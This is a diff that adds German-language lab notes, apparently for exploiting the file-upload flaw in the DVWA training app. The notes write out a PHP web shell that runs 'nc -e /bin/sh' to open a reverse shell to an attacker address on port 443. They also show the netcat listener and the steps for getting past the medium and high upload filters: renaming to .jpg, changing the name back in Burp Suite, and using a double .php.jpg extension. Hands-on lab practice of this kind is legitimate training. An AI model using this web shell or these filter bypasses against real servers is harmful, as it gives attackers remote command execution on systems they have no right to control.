@@ -1,0 +1,43 @@
+#=================#
+#   File Upload   #
+#=================#
+
+touch myrat.php
+  
+echo "<?php shell_exec('nc -e /bin/sh 10.10.10.109 443');?>" > myrat.php
+
+<?php
+shell_exec('nc -e /bin/sh 10.10.10.109 443');
+?>
+
+myrat.php uploaden  unter DVWA Upload
+
+nc -vv -l -p 443
+
+http://10.10.10.103/dvwa/hackable/uploads/myrat.php
+
+
+Secutity auf Medium stellen
+
+lässt nur noch den Upload von JPG zu
+
+cp myrat.php myrat.jpg
+
+nc -vv -l -p 443
+
+File Upload
+
+Upload mit Burp Suit file umstellen auf .php
+
+http://10.10.10.103/dvwa/hackable/uploads/myrat.php
+
+
+Security auf High
+
+cp myrat.php myrat.php.jpg
+
+File Uploaden
+
+nc -vv -l -p 443
+
+http://10.10.10.103/dvwa/hackable/uploads/myrat.php
